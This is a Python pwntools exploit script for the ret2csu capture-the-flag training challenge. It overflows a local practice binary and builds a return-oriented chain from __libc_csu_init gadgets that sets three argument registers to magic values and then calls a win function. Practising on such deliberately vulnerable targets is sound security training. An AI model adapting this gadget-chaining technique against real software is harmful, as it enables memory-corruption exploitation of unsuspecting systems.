#!/usr/bin/python3

from pwn import *



# TODO
write_loc 	= 0x601029

# TODO
print_file 	= p64(0x400620)

target		= "./ret2csu"


back_junk 	= b"B" * 20


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2






"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))




io = process(target)

first_out = io.clean(0.5).decode("utf-8")

print(first_out)
payload = junk + new_bp

payload += p64(0x0040069a)		# pop everything
payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15
payload += p64(0x0400680)		# ret call to ptr call


payload += p64(0x0123456789abcdef)	# random junk skipped over
# we have to go through all of the pops again from gaget 1

payload += p64(0x1)			# rbx val *8 for call
payload += p64(0x2)			# rbp must be 1 more then rbx
payload += p64(0x600e48-8)		# Base of the call, do nothing ptr in dynamic
payload += p64(0xdeadbeefdeadbeef)	# edi through r13
payload += p64(0xcafebabecafebabe)	# rsi through r14
payload += p64(0xd00df00dd00df00d)	# rdx through r15


payload += p64(0x04006a3)		# pop edi address
payload += p64(0xdeadbeefdeadbeef)	# edi value

payload += p64(0x400510)		# the ret2win addr

# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

input("exploit sent hit enter to end")
io.send(payload)


print(io.clean(0.5).decode("utf-8"))


sleep(1)


f = open('./payload', 'wb')
f.write(payload)
f.close()
